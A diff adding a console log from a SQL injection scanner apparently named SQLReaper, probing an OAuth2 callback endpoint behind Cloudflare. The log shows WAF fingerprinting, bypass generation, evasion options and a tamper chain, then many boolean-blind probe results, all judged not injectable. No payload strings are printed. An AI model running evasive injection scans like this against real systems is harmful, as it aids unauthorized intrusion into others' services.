@@ -1,0 +1,2502 @@
+[+] [v21] Adaptive Extraction ENABLED (mutation_engine=SQLMutationEngine)
+[+] [v21]   Max bypasses: 10
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 05:48:35 url='/oauth2/callback&re
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[!] StealthEngine: blocking detected, delay  1.2s
+[!] StealthEngine: blocking detected, delay  3.1s
+[!] StealthEngine: blocking detected, delay  7.8s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: 5 consecutive max-delay blocks — WAF not responding to delay strategy. Permanently disabling backoff, delay fixed at 0.5s (BUG-V198-STEALTH-SAWTOOTH FIX)
+[+] ML WAF fingerprint: Cloudflare (conf=0.94, probes=5, votes={'Cloudflare': 5})
+[+] ML WAF: Cloudflare
+[+] [v19] WAFMLBypassGenerator activated (WAF=Cloudflare, waf_bypass=5)
+[+] Safe-mode verification:
+ Ready to scan [oracle=differential]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   403/WAF  DIFFERENTIAL oracle active
+   Use --playwright to handle JS challenge, or resolve manually
+   Differential oracle active (emd_med=0.0002 rounds=3/5 status_diff=False)  scanning in DIFFERENTIAL mode
+[+] [OracleMode] Selected: differential
+[+] Pre-scan verification OK
+[+] Jitter profile: mean=0ms std=0ms p99=0ms min_sleep=3.0s
+[!] Jitter profile recommends SLEEP(3.0s) (target natural variance too high for 2.0s)
+[+] Auto-adjusted --time-sec to 3.0s
+[+] [v19] Oracle mode confirmed: differential
+[*] [diag-cascade] _v14_cascade entered: url='/oauth2/callback&response_type'
+[+] KB tamper chain: ['intersect_except', 'subquery_wrap', 'space2mssqlblank', 'lowercase', 'keywordsplit']
+[*] [diag-cascade] discovered params: [] markers=[]
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 6 DBMS × 10 categories × 0 params × 3 methods
+[*]  DBMSes   : ['MySQL', 'PostgreSQL', 'MSSQL', 'SQLite', 'Oracle', 'MariaDB']
+[*]  Params   : []
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 18000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: GET ...e+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM: (0 params, source=direct)
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+[+] Primary surface found nothing  expanding to bypass Cloudflare WAF
+[*] Launching 5 parallel surface scans: headers (14 injection points), path segments, JSON body, POST method, PUT method
+[*] [SURFACE] Testing 14 header injection points...
+[*] [SURFACE] Testing path segment injection...
+[+] Path segment injection: 1 segments in /oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:
+[*] [diag-surface] scan_surface called: surface='POST:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' params=['id']
+[+] Scanning surface: 'POST:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='id' already_confirmed=False
+[*] --- testing 'id' @ /oauth2/callback&response_type=code&rhlk
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'id'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[Gate]  All 12 optimizations enabled
+[*] [diag] entering try_all: param='id' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'id'...
+[*] [diag-surface] scan_surface called: surface='PUT:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' params=['id']
+[+] Scanning surface: 'PUT:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='id' already_confirmed=False
+[*] --- testing 'id' @ /oauth2/callback&response_type=code&rhlk
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'id'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[Gate]  All 12 optimizations enabled
+[*] [diag] entering try_all: param='id' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'id'...
+[+] Path injection: segment 0 ('oauth2')
+[+] [SURFACE] Path detection: path:0:oauth2 [E] MySQL
+[*] PCV re-verifying [E] MySQL  checking error pattern reproducibility...
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/6]: MySQL        | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] MySQL base_tech_map non-empty: {'B': 3181, 'BH': 3181, 'IN': 3181, 'BT': 3181, 'T': 3181, 'TH': 3181, 'HQ': 3181, 'E': 3181, 'EH': 3181, 'U': 3181, 'UE': 3181, 'UH': 3181, 'S': 3181, 'ST': 3181, 'NV': 3181, 'WB': 3181, 'EX': 3181, 'HY': 3181, 'SO': 3181}
+    [B] MySQL: 3181 payloads
+    [BH] MySQL: 3181 payloads
+    [IN] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [T] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [E] MySQL: 3181 payloads
+    [EH] MySQL: 3181 payloads
+    [U] MySQL: 3181 payloads
+    [UE] MySQL: 3181 payloads
+    [UH] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [SO] MySQL: 3181 payloads
+[*] [diag] MySQL base_tech_map non-empty: {'B': 3181, 'BH': 3181, 'IN': 3181, 'BT': 3181, 'T': 3181, 'TH': 3181, 'HQ': 3181, 'E': 3181, 'EH': 3181, 'U': 3181, 'UE': 3181, 'UH': 3181, 'S': 3181, 'ST': 3181, 'NV': 3181, 'WB': 3181, 'EX': 3181, 'HY': 3181, 'SO': 3181}
+    [B] MySQL: 3181 payloads
+    [BH] MySQL: 3181 payloads
+    [IN] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [T] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [E] MySQL: 3181 payloads
+    [EH] MySQL: 3181 payloads
+    [U] MySQL: 3181 payloads
+    [UE] MySQL: 3181 payloads
+    [UH] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [SO] MySQL: 3181 payloads
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] MySQL › Boolean    │ tech=B    │ 634 base payloads (3181 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] MySQL › Boolean    │ tech=B    │ 634 base payloads (3181 expanded)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#1)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#2)
+[!] PCV FAILED [E] MySQL  error pattern not reproducible on re-probe
+[!] [SURFACE] Path PCV FAILED: path:0:oauth2  discarded
+    [B-bool] [MySQL] 'id' req#1 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#1 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#3)
+[*]    Wasserstein comparison probe (param='id' req#2)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#4)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#6)
+    [B-bool] [MySQL] 'id' req#4 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#4 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#7)
+[*]    Wasserstein comparison probe (param='id' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#8)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#9)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#10)
+    [B-bool] [MySQL] 'id' req#7 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#7 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#8)
+[*]   [Wasserstein] dist=0.0002 CONSISTENT (range=0.0000 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#11)
+[*]    Wasserstein comparison probe (param='id' req#8)
+[*]   [Wasserstein] dist=0.0004 CONSISTENT (range=0.0004 < 0.02 over 3 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#12)
+    [B-bool] [MySQL] 'id' req#9 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#9 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#10)
+[*]   [Wasserstein] dist=0.6664 STABLE-PAGE OUTLIER (3/4 probes below 0.15, only 1 above threshold=0.50) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#13)
+[*]    Wasserstein comparison probe (param='id' req#10)
+[*]   [Wasserstein] dist=0.0003 CONSISTENT (range=0.0001 < 0.02 over 4 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#14)
+    [B-bool] [MySQL] 'id' req#11 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#12)
+[*]   [Wasserstein] dist=0.0173 CONSISTENT (range=0.0172 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#15)
+    [B-bool] [MySQL] 'id' req#11 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#12)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#16)
+    [B-bool] [MySQL] 'id' req#13 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#14)
+[*]   [Wasserstein] dist=0.0002 CONSISTENT (range=0.0172 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#17)
+    [B-bool] [MySQL] 'id' req#13 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#18)
+[*]    Wasserstein comparison probe (param='id' req#14)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#19)
+    [B-bool] [MySQL] 'id' req#16 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#20)
+[*]    Wasserstein comparison probe (param='id' req#17)
+[*]   [Wasserstein] dist=0.0003 CONSISTENT (range=0.0172 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#21)
+    [B-bool] [MySQL] 'id' req#18 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#19)
+[*]   [Wasserstein] dist=0.0001 CONSISTENT (range=0.0172 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#22)
+    [B-bool] [MySQL] 'id' req#16 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#17)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#23)
+    [B-bool] [MySQL] 'id' req#20 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#21)
+[*]   [Wasserstein] dist=0.0005 CONSISTENT (range=0.0172 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#24)
+    [B-bool] [MySQL] 'id' req#18 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#19)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#25)
+    [B-bool] [MySQL] 'id' req#22 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#20 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#21)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#26)
+[*]    Wasserstein comparison probe (param='id' req#23)
+[*]   [Wasserstein] dist=0.0004 CONSISTENT (range=0.0004 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#27)
+    [B-bool] [MySQL] 'id' req#22 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#24 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#23)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#28)
+[*]    Wasserstein comparison probe (param='id' req#25)
+[*]   [Wasserstein] dist=0.0002 CONSISTENT (range=0.0004 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#29)
+    [B-bool] [MySQL] 'id' req#24 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#26 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#25)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#30)
+[*]    Wasserstein comparison probe (param='id' req#27)
+[*]   [Wasserstein] dist=0.0001 CONSISTENT (range=0.0004 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#31)
+    [B-bool] [MySQL] 'id' req#26 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#28 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#29)
+[*]   [Wasserstein] dist=0.6660 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.50) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#32)
+[*]    Wasserstein comparison probe (param='id' req#27)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#33)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#34)
+    [B-bool] [MySQL] 'id' req#28 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#29)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#35)
+    [B-bool] [MySQL] 'id' req#31 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#36)
+[*]    Wasserstein comparison probe (param='id' req#32)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#37)
+    [B-bool] [MySQL] 'id' req#31 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#33 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#34)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#38)
+[*]    Wasserstein comparison probe (param='id' req#32)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#39)
+    [B-bool] [MySQL] 'id' req#35 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#36)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#40)
+    [B-bool] [MySQL] 'id' req#33 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#37 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#38)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#41)
+[*]    Wasserstein comparison probe (param='id' req#34)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#42)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#43)
+    [B-bool] [MySQL] 'id' req#35 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#36)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#44)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#45)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#46)
+    [B-bool] [MySQL] 'id' req#37 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#38)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#47)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#48)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#49)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#50)
+    [B-bool] [MySQL] 'id' req#43 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#44)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#51)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#52)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#53)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#54)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#55)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#56)
+    [B-bool] [MySQL] 'id' req#43 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#44)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#57)
+    [B-bool] [MySQL] 'id' req#48 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#49)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#58)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#60)
+    [B-bool] [MySQL] 'id' req#50 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#51)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#61)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#62)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#63)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#64)
+    [B-bool] [MySQL] 'id' req#48 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#49)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#65)
+    [B-bool] [MySQL] 'id' req#54 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#55)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#66)
+    [B-bool] [MySQL] 'id' req#50 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#51)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#67)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#68)
+    [B-bool] [MySQL] 'id' req#56 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#57)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#69)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#70)
+    [B-bool] [MySQL] 'id' req#58 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#54 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#55)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#71)
+[*]    Wasserstein comparison probe (param='id' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#72)
+    [B-bool] [MySQL] 'id' req#56 sim=0.641 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#57)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#73)
+    [B-bool] [MySQL] 'id' req#60 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#61)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#74)
+    [B-bool] [MySQL] 'id' req#58 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#75)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#76)
+    [B-bool] [MySQL] 'id' req#60 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#61)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#77)
+    [B-bool] [MySQL] 'id' req#63 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#64)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#78)
+    [B-bool] [MySQL] 'id' req#62 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#63)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#79)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#80)
+    [B-bool] [MySQL] 'id' req#65 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#66)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#81)
+    [B-bool] [MySQL] 'id' req#65 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#66)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#82)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#83)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#84)
+    [B-bool] [MySQL] 'id' req#68 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#69)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#85)
+    [B-bool] [MySQL] 'id' req#68 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#69)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#86)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#87)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#88)
+    [B-bool] [MySQL] 'id' req#71 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#72)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#89)
+    [B-bool] [MySQL] 'id' req#71 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#72)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#90)
+    [B-bool] [MySQL] 'id' req#73 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#74)
+[*]   [Wasserstein] dist=0.6697 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6663 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#91)
+    [B-bool] [MySQL] 'id' req#73 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#74)
+[*]   [Wasserstein] dist=0.6700 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6662 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#92)
+    [B-bool] [MySQL] 'id' req#75 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#76)
+[*]   [Wasserstein] dist=0.6695 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6694 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#93)
+    [B-bool] [MySQL] 'id' req#77 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#78)
+[*]   [Wasserstein] dist=0.6701 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6694 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#94)
+    [B-bool] [MySQL] 'id' req#75 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#76)
+[*]   [Wasserstein] dist=0.6699 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6694 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#95)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#96)
+    [B-bool] [MySQL] 'id' req#77 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#78)
+[*]   [Wasserstein] dist=0.6699 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6694 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#97)
+    [B-bool] [MySQL] 'id' req#80 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#81)
+[*]   [Wasserstein] dist=0.6697 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6695 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#98)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#99)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#100)
+    [B-bool] [MySQL] 'id' req#80 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#81)
+[*]   [Wasserstein] dist=0.6696 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6695 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#101)
+    [B-bool] [MySQL] 'id' req#83 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#84)
+[*]   [Wasserstein] dist=0.6718 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6695 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#102)
+    [B-bool] [MySQL] 'id' req#82 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#83)
+[*]   [Wasserstein] dist=0.6701 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6696 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#103)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#104)
+    [B-bool] [MySQL] 'id' req#84 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#85)
